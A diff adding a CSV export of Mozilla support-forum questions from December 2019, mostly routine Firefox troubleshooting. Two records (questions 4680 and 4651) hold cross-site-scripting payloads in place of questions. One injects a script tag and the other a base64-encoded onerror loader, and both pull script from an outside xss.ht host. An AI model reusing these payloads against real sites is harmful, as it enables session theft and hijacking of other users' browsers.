@@ -1,0 +1,401 @@
+id,created,updated,title,content,tags,product,topic,locale,answers,creator
+https://support.mozilla.org/en-US/questions/4706,2019-12-09 15:59:28 -0800,2019-12-09T16:44:36Z,macOS ver 71.0 problems,"<p>Firefox has always made me feel happy.  But I am having significant problems with Mac OS version 71.0.
+</p><p>I am running a macOS Catalina v 10.15.1 on a 3 GHz Quad-Core Intel Core i5; 16 GB 2400 MHz DDR4.
+</p><p>I am NOT having a performance issue.  Instead, the browser is not responding as expected when given tasks.
+</p><p>1.  It will not open a link in a new tab.  The tab does not open and it's as if I never clicked on the menu item.  Same with open in new window.
+2.  It will not open the default search engine from the URL bar.  Instead, it responds as if I mistyped a URL.
+3.  It will not allow me to set a Default Search Engine.  The option to do that in Preferences is a drop-down arrow that does nothing when clicked.
+4.  It will not allow me to Remove an add-on.  Usually issues with Firefox are related to add-ons, but when I Remove an add-on, then restart Firefox, the add-on is still there.
+5. (silly, minor issue) I'd like the tab bar to be dark, again.  The white tabs are too bright!  I know this is silly, but you asked...
+</p><p>I did run Firefox in safe mode and all of the same problems continue to occur.
+I did reinstall FF v. 71.0 and all of the same problems continue to occur.
+</p><p>Help.  Please.
+</p>",firefox-710;customize;desktop;mac-os;,firefox,customize,en-US,1272203;,fb3ajb
+https://support.mozilla.org/en-US/questions/4704,2019-12-09 15:39:05 -0800,2019-12-10T16:54:53Z,"I accidently opened a new profile, now I have lost my bookmarks","<p>I only see one profile listed, so I cannot go back to an old profile.  Is there anyway I can recover?  Thanks, glinfoot
+</p>",bookmarks;firefox-710;desktop;windows-10;needsinfo;,firefox,bookmarks,en-US,1272226;1272384;1272491;,glinfoot
+https://support.mozilla.org/en-US/questions/4700,2019-12-09 14:46:32 -0800,2019-12-09T19:26:56Z,Foxfire is not connecting to the internet. I keep getting cannot find server,"<p>Foxfire is not connecting to the internet. I keep getting cannot find server
+</p>",desktop;,firefox,other,en-US,1272167;1272243;,mhawk57
+https://support.mozilla.org/en-US/questions/4699,2019-12-09 14:44:05 -0800,2019-12-09T16:23:04Z,Site might add malware disguised as a Firefox Add-on: intuitTax2020.com,"<p>After I clicked on ""Accept"", it did NOT offer the option to proceed to ""<a href=""http://intuitTax2020.com"" rel=""nofollow"">intuitTax2020.com</a>"" without adding the Add-on, as promised.  I also could not find a ""Safety Search"" Add-on in the Firefox ""about: addons""  page.  (I have never heard of the ""Firefox Store"".)
+</p>",firefox-700;customize;desktop;windows-10;maleware;,firefox,customize,en-US,1272163;1272176;1272182;1272199;,nkennington@juno.com
+https://support.mozilla.org/en-US/questions/4698,2019-12-09 14:42:24 -0800,2019-12-09T14:42:24Z,Foxfire is not connecting to the internet. I keep getting cannot find server,"<p><em>dupe of <a href=""https://support.mozilla.org/en-US/questions/1274700"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1274700</a></em>
+</p><p>Foxfire is not connecting to the internet. I keep getting cannot find server
+</p>",other;desktop;,firefox,other,en-US,"",mhawk57
+https://support.mozilla.org/en-US/questions/4697,2019-12-09 14:10:58 -0800,2019-12-09T17:20:45Z,How do I add other websites to the Facebook Container? I'm given no option to do so,"<p>I'd like the ""share"" option to work when I'm on <a href=""http://impeach.org"" rel=""nofollow"">impeach.org</a>. But there's no option to do so. When I click the ""fence"" icons on this site, I'm given no option to add the site. Though I've seen that option on other sites.
+</p>",firefox-700;customize;desktop;firefox-7001;mac-os;,firefox,customize,en-US,1272152;1272207;1272215;,jasonkulas
+https://support.mozilla.org/en-US/questions/4696,2019-12-09 14:08:31 -0800,2019-12-09T18:48:04Z,Middle click opens a new window,"<p>I have issues with my mousewheel so I like to press Middleclick to open this circle, in which I then move my mouse up or down to scroll. It's also called ""Auto Scroll"".
+</p><p>The trouble is, when you activate it on a link, it opens a new tab instead of activating auto scroll. So thats when I disabled that in about:config. I set browser.tabs.opentabfor.middleclick to false.
+</p><p>But not what it does is it opens a new window. And I don't know how to disable that. 
+</p><p>Do any of you know a workaround? I know there are extensions for this but I really really like the basic Autoscroll.
+</p>",tabs;firefox-710;desktop;windows-10;,firefox,tabs,en-US,1272161;1272183;1272200;1272229;1272232;1272240;,kawalecld
+https://support.mozilla.org/en-US/questions/4693,2019-12-09 13:23:03 -0800,2019-12-09T15:43:59Z,firefox won't let me change search engine at all,"<p>Question.. I have had zero issues in the past when searching things in firefox .. it would go automatically through google..now for somewhat reason it's using timewarner cable search and i've tired the preference button, clicked on search, but where it says default search engine its completely blank.. like no option comes up .. when  i click on that box its a small blank box with zero options.. and it wont allow me to add anything.. any clue on what i can do?
+</p>",firefox-710;other;desktop;mac-os;,firefox,other,en-US,1272136;1272138;1272145;1272148;1272151;1272164;1272175;,robin.wildberger
+https://support.mozilla.org/en-US/questions/4692,2019-12-09 13:05:02 -0800,2019-12-10T09:56:35Z,Po updatu na 71.0 se mi ztratila možnost zobrazení panelů ve více řádcích.,"<p>Po updatu na 71.0 se mi ztratila možnost zobrazení panelů ve více řádcích.
+</p>",tabs;firefox-710;desktop;windows-10;,firefox,tabs,cs,1272364;,Mila_s
+https://support.mozilla.org/en-US/questions/4689,2019-12-09 11:53:13 -0800,2019-12-09T17:21:44Z,How do I print off my Usernames and Passwords as I was able to do in the past. I do NOT like this new account.,"<p>All I want to do is make a hard copy of my UserNames and Passwords. It used to be easy but not anymore.
+</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1272124;1272147;1272170;1272216;,vegaspatt
+https://support.mozilla.org/en-US/questions/4688,2019-12-09 11:52:03 -0800,2019-12-09T13:06:19Z,ASPERA 3.9 Connect not working on latest firefox ( Dec-12-2019),"<p>The app boots up when prompted thru browser but wont actually work.
+</p>",firefox-710;customize;desktop;windows-10;asperaconnect;3rdpartysoftware;,firefox,customize,en-US,1272126;,steve142
+https://support.mozilla.org/en-US/questions/4686,2019-12-09 11:07:09 -0800,2019-12-09T11:56:08Z,i can't restore data or sync and i lost my bookmarks and logins and ...  what can i do?,"<p>Signed in to my account but my information will not be restored. What should I do?
+</p>",firefox-700;firefox-7001;desktop;sync;windows-10;,firefox,sync,en-US,1272104;,info1079
+https://support.mozilla.org/en-US/questions/4685,2019-12-09 10:58:29 -0800,2019-12-10T11:59:43Z,"Lockwise in FF 71.0 64bit recording asterisks as password?  On ""no username"" UID?  Thanks","<p>I clicked the green ""Automatically add"" button for ""Troubleshooting information:"" just below this text box, and it took me to a dead page, and lost everything I had typed (yeah, rookie mistake on my part, fine)...  the landing page address: <a href=""https://addons.mozilla.org/firefox/downloads/latest/426841/addon-426841-latest.xpi"" rel=""nofollow"">https://addons.mozilla.org/firefox/downloads/latest/426841/addon-426841-latest.xpi</a> ..
+</p><p>.. with text:
+""
+</p><pre>Add-ons
+</pre>
+<p>We're sorry, but we can't find what you're looking for.
+</p><p>The page or file you requested wasn't found on our site. It's possible that you clicked a link that's out of date, or typed in the address incorrectly. 
+""
+</p><p>..... and continuing on for a bit after that.
+</p><p>basic problem is described in subject line.  I could gripe endlessly about prior disclosure, and how appalling it is to see this problem persist over several versions, but mostly I'm curious how it does not seem to have been asked / answered yet?
+</p><p>I will upload screencaps if needed, but I am going to a banking website, entering UID &amp; password, and telling FF to update the password.  Not only does it not update for that UID, instead putting it into the ""no username"" storage for this website, but it is storing asterisks (in the same amount as the actual password) instead of the password.  Yes, I clicked on the little ""eye"" next to the password field under Tools.Options.Privacy .. and yes, I tried trusting and just using the stored password both for the UID (it kept the old password) and also for the ""no username"" and neither works.  I can update the password manually when under Tools.Options.Privacy, but I do not have the time nor inclination to do this for hundreds of logins.
+</p><p>This is entirely unacceptable, and needs to be fixed post haste.
+</p><p>Now copying and pasting everything I typed here, because I fully expect that I'll click ""Post Question"" and all will be lost...
+</p><p><br>
+FF 71.0 64bit updated 09 Dec 2019 - Win7 home 64 bit .. hardly any addins/plugins as the ones I used have mostly been deprecated through all the updates.
+</p><p>My profile along with stored passwords has been carried forward through at least three years of updates with no problems, prior to Quantum.
+</p>",firefox-710;desktop;fix-problems;escalate;lockwise;,firefox,fix-problems,en-US,1272088;1272090;1272128;1272399;1272404;,chris142
+https://support.mozilla.org/en-US/questions/4684,2019-12-09 10:57:05 -0800,2019-12-30T15:16:25Z,"Firefox no longer able to open SharePoint documents in app - ""one of the following protocols (ms-word) isn’t associated with any program or is not allowed""","<p>I've been using Firefox for many months and rarely had issues with this, but I've been unable to open documents from SharePoint to the MSFT apps on my computer for the last two weeks. When I have a SharePoint link that I need to open, one of two things happens: 
+- if I right-click on the link and select ""open in Word"" (or whatever MS product I need), I get the following error message: ""Firefox doesn’t know how to open this address, because one of the following protocols (ms-word) isn’t associated with any program or is not allowed in this context.    You might need to install other software to open this address""
+</p><p>- If I open the document in the browser and then select ""Open in app,"" it indicates that the app has been opened but nothing happens.
+</p><p>Any ideas on how to fix this?
+</p>",firefox-710;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,1273119;1273154;1277295;1277301;,claire.a.coleman
+https://support.mozilla.org/en-US/questions/4680,2019-12-09 10:10:59 -0800,2019-12-09T10:17:13Z,"""><script src=https://xssnoob.xss.ht></script>","<p>""&gt;&lt;script src=<a href=""https://xssnoob.xss.ht"" rel=""nofollow"">https://xssnoob.xss.ht</a>&gt;&lt;/script&gt;
+</p>",firefox-710;other;desktop;windows-10;,firefox,other,en-US,1272054;1272055;1272056;1272057;1272058;1272060;1272061;1272062;1272063;1272064;1272065;,koliboychetan
+https://support.mozilla.org/en-US/questions/4678,2019-12-09 09:40:26 -0800,2019-12-09T10:19:49Z,Add-ons do not show on toolbar when history is disabled. Can someone explain why?,"<p>I have the same issue user irisbis had: <a href=""https://support.mozilla.org/en-US/questions/1078548"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1078548</a>
+</p><p>Add-ons do not show in the toolbar when firefox is set to never remember history. I would like to know why this is the case, does somebody understand the reason?
+</p>",firefox-700;customize;desktop;linux;,firefox,customize,en-US,1272046;1272048;1272050;1272053;1272067;,mundisgl
+https://support.mozilla.org/en-US/questions/4677,2019-12-09 09:39:01 -0800,2019-12-09T09:39:01Z,Address was not understood,"<p>We use Datto RMM at work and when I go to launch the agent browser(The name of their tool) I get the above error. Most of the time I can close and open Firefox a few times and it will then work. Today however it will not work. I tried running FF in safe mode and still nothing. The setting under appilcations is correct and also the registry settings for the protocol cag are also correct. I can launch the software from IE which just makes me shutter.
+</p>",firefox-710;desktop;fix-problems;windows-10;dattormm;,firefox,fix-problems,en-US,"",joe61
+https://support.mozilla.org/en-US/questions/4676,2019-12-09 09:25:01 -0800,2019-12-09T10:05:38Z,"I received multiple emails to my personal email account instructing me to confirm my email, for an account I did not create.  How do I prevent fraud?","<p>Yesterday I received two separate emails (to my personal email account, separate from the one I used to post this message) from Firefox as part of a new account creation, neither of which I requested.  The first included a link to confirm my email. The second included a verification code.
+</p>",privacy-and-security_1;desktop;firefox-650;mac-os;,firefox,privacy-and-security,en-US,1272043;1272051;,jkeene5
+https://support.mozilla.org/en-US/questions/4675,2019-12-09 09:08:16 -0800,2019-12-09T17:31:39Z,link to reset password Bad Request,"<p>I get this error when trying to reset password
+</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1272032;1272214;1272224;,1940woodchuck
+https://support.mozilla.org/en-US/questions/4673,2019-12-09 09:00:27 -0800,2019-12-09T09:04:55Z,"Youtube opens a random channel every time I go on Youtube website, how to solve this?","<p>Every time I go to <a href=""http://youtube.com"" rel=""nofollow"">youtube.com</a>, a random channel is loaded and I can't get out of it...
+I've tried a fresh FireFox install, but the same thing happens all the time
+</p>",firefox-710;websites;desktop;windows-10;youtubehd;add-ons;youtubehdproblem;,firefox,websites,en-US,1272028;,eitan.rotbart
+https://support.mozilla.org/en-US/questions/4672,2019-12-09 08:56:36 -0800,2019-12-09T09:02:29Z,Is Firefox account secure?,"<p>I have probably a virus and I reinstall new Windows system. In firefox account is synchronization with my Firefox. But also are AddOns, these addon can be infected. Ask: On account are my addons as files or only infomration about installing addons and there are loaded new?
+</p>",privacy-and-security_1;firefox-710;desktop;windows-10;,firefox,privacy-and-security,en-US,1272027;,borucki.andrzej
+https://support.mozilla.org/en-US/questions/4671,2019-12-09 08:55:36 -0800,2019-12-09T09:36:41Z,Is there any way I can prevent an ad-on from being uninstalled/disabled without installing any additional add-ons (like this one https://addons.mozilla.org/en-U,"<p>As the title says
+</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,en-US,1272029;1272042;,dragos.08mai
+https://support.mozilla.org/en-US/questions/4669,2019-12-09 08:16:34 -0800,2019-12-09T11:35:59Z,"After clearing Firefox cache, I can't access gmail.","<p>Firefox was running very slowly, so I cleared the cache. Now I cannot open gmail. When I try, gmail opens a page that prompts me to set up a new account. Gmail opens fine in Safari &amp; Opera. I do not have any security apps loaded that might create a conflict.
+</p>",firefox-710;desktop;fix-problems;mac-os;,firefox,fix-problems,en-US,1272008;1272013;1272018;1272031;1272037;1272049;1272095;,adennichols
+https://support.mozilla.org/en-US/questions/4667,2019-12-09 07:39:41 -0800,2020-01-04T06:57:46Z,"mac error message: The application 'Firefox"" can't be opened","<p>Tried removing application, empty trash, reinstalled firefox, rebooted mac. Same error. Also tried holding down control and opening program. Did not help. Mac OS 10.14.6.
+</p>",desktop;fix-problems;,firefox,fix-problems,en-US,1272015;1272017;1278332;1278334;1278337;,fredhaim
+https://support.mozilla.org/en-US/questions/4665,2019-12-09 07:19:47 -0800,2019-12-09T11:52:24Z,"My screen size just changed, there is about a 1/2"" of  my screen saver showing at the bottom. Whe I use the zoom it cuts the top off. How do I fix this problem?","<p>This happened when I tried to install adobe flash
+</p>",firefox-710;other;desktop;mac-os;,firefox,other,en-US,1272026;1272101;,Hombart
+https://support.mozilla.org/en-US/questions/4664,2019-12-09 06:54:21 -0800,2019-12-09T06:54:21Z,picture-in-picture posicionamento personalizado,"<p>A posição padrão do picture-in-picture do firefox em alguns frames de vídeos fica sendo sobre posto por algum elemento do reprodutor no meu caso, o problema ocorre devido o botão de próximo estar sobrepondo o picture-in-picture. Então minha ideia seria que vocês deixassem a posição do mesmo personalizável, assim se o usuário tiver problemas com a posição do objeto ele poderia alterar a partir da guia ""personalizar"".
+</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,pt-BR,"",josafadieb
+https://support.mozilla.org/en-US/questions/4663,2019-12-09 06:48:13 -0800,2019-12-09T09:33:06Z,An extension has disappeared from AMO with no explanation... should I be worried?,"<p>I've been using the extension Screengrab! for years, and still have it installed (v2.18), but it seems to have disappeared from the add-ons repository without trace. How do I find out if the author has retired it or if Mozilla have acted over some security fear? The extension still seems to be available in the Chrome web store (can't see a version number). Screengrab! had tens of thousands of users and had been updated for web extensions (although with some loss of functionality) so it seems strange for it to just disappear.
+</p>",firefox-710;other;desktop;windows-7;screengrab;,firefox,other,en-US,1271991;1272002;1272004;1272025;1272035;1272040;,BlazingReynard
+https://support.mozilla.org/en-US/questions/4662,2019-12-09 06:44:20 -0800,2019-12-09T09:14:04Z,Login and Password Surround Boxes Not Showing,"<p>When logging into a site that needs a User Name and Password, the actual boxes are not highlighted to insert relevant details. This applies to saved logins as well.  To overcome this issue I have to enter any character to bring up the boxes and then delete this character. The empty box then remains to enter the details. I have tried Chrome and the boxes are there.
+</p>",firefox-680;other;desktop;windows-10;,firefox,other,en-US,1271982;1271985;1272000;1272030;1272033;,ActrosMP2
+https://support.mozilla.org/en-US/questions/4658,2019-12-09 05:51:36 -0800,2019-12-16T07:58:59Z,firefox crashes at startup,"<p>Overnight (I changed nothing, but microsoft rebooted my computer and I don't see any new files installed or updates) Firefox will not work. I can see it start up in task manager (two processes) but within 1 second both are gone. I've tried uninstalling and reinstalling firefox. Same problem. This is Windows 10 v 1909. Firefox will not start in safe mode. I cannot find any crash files (in the past month).
+</p>",firefox-700;desktop;fix-problems;windows-10;escalate;download-and-install;,firefox,fix-problems,en-US,1271956;1271963;1271966;1273228;1273964;,mattffff
+https://support.mozilla.org/en-US/questions/4656,2019-12-09 05:35:45 -0800,2019-12-09T07:24:36Z,Secure Connection Failed,"<p>The page you are trying to view cannot be shown because the authenticity of the received data could not be verified
+</p>",other;desktop;,firefox,other,en-US,1271947;1271983;1271999;,bolo2fast4u
+https://support.mozilla.org/en-US/questions/4655,2019-12-09 05:21:19 -0800,2019-12-09T06:06:00Z,How do I hide tab bar scroll buttons in FF 71?,"<p>Before FF 71, I had been using this userChrome CSS to hide the scroll buttons:
+</p>
+<ol><li>TabsToolbar toolbarbutton[class^=""scrollbutton""] {
+</li></ol>
+<pre>   display: none !important;
+   }
+</pre>
+<p>Now it's stopped working. Does anyone know the new code?
+</p>",firefox-710;customize;desktop;mac-os;tabbarscrollbutton;tabbarscrollbutton71;hacks;unsupportedhacks;userchromecss;unsupporteduserchromecss;,firefox,customize,en-US,1271944;1271952;1271959;,practik
+https://support.mozilla.org/en-US/questions/4652,2019-12-09 05:11:35 -0800,2019-12-09T06:02:10Z,ff is not handling Look-Alike Domains properly,"<p>there is a known issue where scammers setup Look-Alike Domains so the URL appears like  <a href=""http://apple.com"" rel=""nofollow"">apple.com</a> or your bank to deceive unsuspecting users ... see      <a href=""https://hackaday.com/2017/04/19/you-think-you-cant-be-phished/"" rel=""nofollow"">https://hackaday.com/2017/04/19/you-think-you-cant-be-phished/</a>
+</p><p>I tested this on ff nightly and the Look-Alike hacked site just appeared as  <a href=""https://www.аррӏе.com/"" rel=""nofollow"">https://www.аррӏе.com/</a>  
+</p><p>ff has setting in about:config
+</p><p>network.IDN_show_punycode
+</p><p>which defaults to false ... when set to true above issue is resolved and browser properly shows actual underlying faked URL as <a href=""https://www.xn--80ak6aa92e.com/"" rel=""nofollow"">https://www.xn--80ak6aa92e.com/</a>  and not  <a href=""https://www.аррӏе.com/"" rel=""nofollow"">https://www.аррӏе.com/</a>  
+</p><p>Firefox should fix this default setting
+</p>",other;desktop;linux;,firefox,other,en-US,1271954;,EventHorizon
+https://support.mozilla.org/en-US/questions/4651,2019-12-09 05:05:17 -0800,2019-12-09T07:04:23Z,"""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzbm9vYi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eva","<p>""&gt;<img src=""x"">
+</p>",firefox-710;websites;desktop;,firefox,websites,en-US,1271939;1271940;1271941;1271942;1271943;,nik08
+https://support.mozilla.org/en-US/questions/4649,2019-12-09 04:28:28 -0800,2019-12-09T14:34:35Z,thumbnail size in upload dialog (linux),"<p>I am using firefox on linux (kde plasma) and when I go to upload a photo in a webpage I get the upload dialog but the thumbnails are too small to view which I really need for photos and there are no view options to change the size of them... This feels like a fundamental feature I'm missing...  Is it possible?
+</p><p>Attached the upload dialog window
+</p>",other;firefox-700;firefox-7001;desktop;linux;,firefox,other,en-US,1272010;1272021;1272144;1272153;,hello33
+https://support.mozilla.org/en-US/questions/4648,2019-12-09 03:59:28 -0800,2019-12-10T10:36:02Z,"How can I remove bundled search engines (Amazon, Bing, etc.) for good?","<p>Hello, I still have Amazon, Bing, Chambers &amp; co. in my extension list in about:support, even though i have disabled all of them in about:preferences#search. How can I purge them for good?
+</p><p>Firefox 71.0 on Fedora 31.
+</p>",firefox-710;customize;desktop;fedora;,firefox,customize,en-US,1271977;1271988;1271990;1272303;1272321;1272382;,Fulan
+https://support.mozilla.org/en-US/questions/4646,2019-12-09 03:30:10 -0800,2019-12-09T03:30:10Z,Firefox is requiring a security key be inserted to login to Microsoft.,"<p>I have never had one and never used one.  It will not allow any other type of login.  This does not occur on IE or Chrome.
+</p>",firefox-710;desktop;fix-problems;windows-10;troubleshootingdetailsmissing;,firefox,fix-problems,en-US,"",john207
+https://support.mozilla.org/en-US/questions/4645,2019-12-09 03:08:30 -0800,2019-12-09T03:10:31Z,How can I customize my outgoing email,"<p>I would like to have a pre-setup page as outgoing mail with my name and company details on as a ""footer"".  How do I go about setting this up?
+</p>",customize;desktop;,firefox,customize,en-US,1271930;,klomedaid
+https://support.mozilla.org/en-US/questions/4644,2019-12-09 02:32:35 -0800,2019-12-09T23:04:29Z,Please can I waste hours on end with firefox help on non existant problems on other platforms,"<p>Been trying to open yahoo mail as I need it on a computer not on the phone. I use it every day plenty of times on the phone and laptop. Today I can't open it. Firefox says theres an update, so I download it. I then have to verify my firefox account with my email...of which I cannot open. Yet again another stupid update poorly researched and executed. No doubt I will be told its my fault because I dont have update 72.3.56.786  or install 234.3987.2 or some crap no one would ever know about
+</p>",firefox-700;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,1272006;1272011;1272117;1272139;1272264;1272265;,andybeee12345
+https://support.mozilla.org/en-US/questions/4640,2019-12-09 01:01:14 -0800,2019-12-09T12:31:39Z,How do i  prevent long list of login credential suggestions,"<p>Hi all,
+</p><p>All of a sudden i get a long list of login credentials suggestions. Normally FF would only just present login cred suggestions for the site name i'm trying to log on, but now i get a long list of them. Also for sites that i'm not on. Is this one of the 'virtues' of LockWise?
+</p><p>What happend along the way, and can i turn this 'feature' off so that i only get login credential suggestions for the site i'm actually trying to log on?
+</p>",tips;firefox-710;desktop;,firefox,tips,en-US,1271919;1271923;1272109;,leemkire
+https://support.mozilla.org/en-US/questions/4637,2019-12-08 21:58:05 -0800,2019-12-08T23:26:58Z,firefox installed. but require the firefox install.,"<p>i installed firefox.
+but after a day or two, add-ons pages, 'Only with Firefox—Get Firefox Now' so can't install add-ons.
+how to fix it?
+</p>",firefox-710;other;desktop;windows-10;,firefox,other,en-US,1271903;1271904;1271907;,jmlee199
+https://support.mozilla.org/en-US/questions/4635,2019-12-08 20:52:40 -0800,2019-12-09T09:42:29Z,How to post code on forum?,"<p>How do you post source code on these support forums?
+</p><p>Like below;
+</p>
+<ol><li>TabsToolbar {
+</li></ol>
+<pre>position: absolute !important;
+bottom: 0 !important;
+width: 100vw !important;
+</pre>
+<p>}
+</p>",firefox-710;other;desktop;windows-7;tabsonbottom71;tabsonbottom;hacks;unsuppportedhacks;unsupporteduserchromecss;userchromecss;,firefox,other,en-US,1271896;1271906;1271909;1272007;1272016;1272024;1272036;1272044;,jorb
+https://support.mozilla.org/en-US/questions/4633,2019-12-08 19:34:47 -0800,2019-12-09T06:07:57Z,Firefox 70.1 on iMac Catalina won't remember browser history. Nothing shows in any menu.,"<p>I cannot recall any browser history. I am running Firefox 70.0.1 (64 bit) on my new iMac with Catalina (10.15.1). Every menu for history is empty. I also am unable to delete browsing tabs. I am using Google search engine. Very frustrating...
+</p><p>greats@aol.com
+</p>",firefox-710;other;desktop;mac-os;,firefox,other,en-US,1271893;1271962;,greats
+https://support.mozilla.org/en-US/questions/4632,2019-12-08 19:25:20 -0800,2019-12-09T06:21:19Z,One website page is not displaying properly,"<p>As of a few days ago the following website stopped displaying the petitions accurately. (<a href=""https://www.thepetitionsite.com/takeaction/969/550/917/"" rel=""nofollow"">https://www.thepetitionsite.com/takeaction/969/550/917/</a>) The page/s look like they are loading in an html format which makes them useless to me as I CANNOT sign petitions. I checked to see if this problem occurs in Chrome and it does NOT, so this is only happening in Firefox. I hope you can help me figure this out.  ~Thank You, P.S. Here is how the page looks. It is not supposed to be loading like this.
+</p>",firefox-710;websites;desktop;windows-7;,firefox,websites,en-US,1271901;1271967;1271968;,Hvnly777
+https://support.mozilla.org/en-US/questions/4630,2019-12-08 18:02:37 -0800,2019-12-08T18:02:37Z,Não consigo transmitir lives no YouTube utilizando o Firefox. Quando abro o painel ao vivo a tela fica preta e não aparecem as opções para iniciar a transmissão,"<p>Estou tentando fazer uma transmissão ao vivo no Youtube pelo Firefox, porem quando abro o studio e clico em criar a transmissão , a tela fica preta e não termina o carregamento (congela). Eu consegui transmitir há uma semana mas nesta sexta o problema não me deixou e ainda continua hoje (domingo).
+</p><p>Eu já tentei:
+- Reiniciar o Firefox em modo seguro
+- Restaurar o Firefox
+- Atualizar o Flash
+- Limpar dados de navegação
+- Outras contas do Youtube
+- Atualizar windows
+- Usar Firefox em outro computador
+</p><p>Mas nada adiantou. No Google Chrome o painel ao vivo abre e eu consigo transmitir.
+</p>",firefox-710;other;desktop;windows-10;,firefox,other,pt-BR,"",doug12.89
+https://support.mozilla.org/en-US/questions/4626,2019-12-08 15:43:10 -0800,2019-12-13T11:06:42Z,Deleted account log-ins now showing in FF71,"<p>Since FF71 was installed I'm now seeing log-in information for accounts I whacked up to five years ago. When I look at saved log-ins none of these old accounts appear. What gives.
+</p>",firefox-710;other;desktop;windows-10;troubleshootingdetailsmissing;,firefox,other,en-US,1271875;1272212;1272222;1273132;1273136;1273293;,RealGomer
+https://support.mozilla.org/en-US/questions/4625,2019-12-08 15:35:28 -0800,2019-12-13T00:08:32Z,"Firefox will not load, doing a clean install of Firefox did not fix the problem.  Doing a clean install with a fresh profile did not fix the problem either.","<p>I have been having problems with firefox lately.  Every time I try to run the program it automatically closes without giving an error message.  I am running Windows 10 and this happens in safe mode as well.   I have tried doing a clean install of firefox - that did not fix the problem.  I tried deleting my profile after uninstalling then doing a fresh install, this did not fix the problem either.  I ran a virus scan and did not detect any malware.  I don't know what else to try.
+</p>",desktop;fix-problems;windows-10;webcompanion;probablynotafirefoxproblem;webcompanion71;3rdpartysoftware;escalate;download-and-install;,firefox,fix-problems,en-US,1271881;1272110;1272130;1272486;1272490;1272492;1272566;1272596;1273112;1273157;1273173;,dpmorga
+https://support.mozilla.org/en-US/questions/4624,2019-12-08 14:36:04 -0800,2019-12-09T11:42:01Z,How to make new window open non-maximized.,"<p>I'm very new to Firefox, so I'd appreciate your help.
+</p><p>When I want to view something in a new window, I right-click to bring up the menu, then left-click on ""Open link in new window"".  The new window opens maximized (full screen).  Is there any way to make the new window open less than full screen?  I know that I can click on ""Restore down"" in the upper right corner to get the smaller size that I want -- but is there a setting I can use to make the additional window open in that smaller size by default?
+</p><p>I'm not terribly tech savvy, so you're welcome to provide as much detail as you like; I won't be offended if you ""dumb it down"".  ;-)
+</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1271861;1272038;1272099;,mrshvd3
+https://support.mozilla.org/en-US/questions/4623,2019-12-08 14:05:21 -0800,2019-12-09T16:47:48Z,How can I be in safe mode with firefox,"<p>I am truly technologically challenged. I've read everything about strating and/or accessing Safe Mose using Firefox but I don't understand any of them.
+Can someone PLEASE, tell me how to do it, step by step, using words a savvy 2 1/2 year old can follow? I'd really appreciate it.
+</p>",firefox-710;other;desktop;windows-10;,firefox,other,en-US,1271835;1272196;1272197;1272206;,strshne420
+https://support.mozilla.org/en-US/questions/4620,2019-12-08 13:56:43 -0800,2019-12-09T11:18:07Z,"I use latest version of Firefox as my browser. How can I remove the tracking link, guce.advertising.com which is now attempting to load when opening a tab from","<p>I use latest version of Firefox as my browser. How can I remove the tracking link, <a href=""http://guce.advertising.com"" rel=""nofollow"">guce.advertising.com</a> which is now attempting to load when opening a tab from my home page <a href=""http://www.huffpost.com?"" rel=""nofollow"">www.huffpost.com?</a> I use u-Block Origin, which does recognize this. I also have Malwarebytes pro, Zemana AntiMalware, CCleanerPro (Removes trackers upon closing browser) and Eset NOD32 Antivirus.  None catch, remove or quarantine this tracker.  What is the solution??? I have done the ""Refresh"" and re-installed add-ons. Opening new tab goes to this site:  moz-extension://e6856081-a532-44e4-8c4d-7c9c6332e602/document-blocked.html?details=%7B%22url%22%3A%22https%3A%2F%<a href=""http://2Fguce.advertising.com"" rel=""nofollow"">2Fguce.advertising.com</a>%2FcollectIdentifiers%3FsessionId%3D2_cc-session_f733ad9e-b28c-4193-9142-ec4c51d19491%22%2C%22hn%22%3A%<a href=""http://22guce.advertising.com"" rel=""nofollow"">22guce.advertising.com</a>%22%2C%22dn%22%3A%<a href=""http://22advertising.com"" rel=""nofollow"">22advertising.com</a>%22%2C%22fs%22%3A%22%7C%<a href=""http://7Cadvertising.com"" rel=""nofollow"">7Cadvertising.com</a>%5E%22%7D
+</p>",firefox-710;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,1271899;1271965;,JJEULER
+https://support.mozilla.org/en-US/questions/4617,2019-12-08 13:42:13 -0800,2019-12-08T20:56:19Z,Lost firefox password. Can i import everything to safari on my mac and then import it back into firefox after resetting my password?,"<p>I lost my password for Firefox somehow.
+</p><p>I have my secondary email set up.
+I have account recovery not enabled
+I have two step authentication not enabled
+</p><p>I do not have a saved password in either Firefox itself or on iClouds keychain that works. 
+</p><p>I understand that if I were to reset my password, I would lose everything. 
+</p><p>On my desktop, I have 289 saved passwords 
+On my iPhone I probably have that many or more unsynced passwords. 
+</p><p>I have 10 years worth of bookmarks and history as well. I don’t really care about the history, but the bookmarks are important. 
+</p><p>If there is no way to recover my password for Firefox, can I use Apple's Safari browser to export my usernames/passwords and bookmarks on my desktop and import them back in after I reset my password (which will reset my firefox account) ?
+</p><p>Also, if I do this, how will it affect my iPhone Firefox? Its not currently logged into firefox due to the password issue.
+Thanks!
+</p>",download-and-install_1;firefox-710;desktop;mac-os;,firefox,download-and-install,en-US,1271897;,moroni1
+https://support.mozilla.org/en-US/questions/4615,2019-12-08 13:02:27 -0800,2019-12-08T13:37:31Z,"The logo of Amazon in the top bar inside the website (the one on the top left) doesn't show correctly, even on a new laptop, after syncing my firefox account.","<p>I thought that this was a problem related to my old laptop. Now, after I got a new laptop, I just signed in into my firefox account and made it sync my data, and to my surprise the amazon logo still does not show up correctly for me on firefox. Please advise! :)
+</p>",firefox-710;websites;desktop;windows-10;,firefox,websites,en-US,1271816;1271819;,sherif.alqallawi
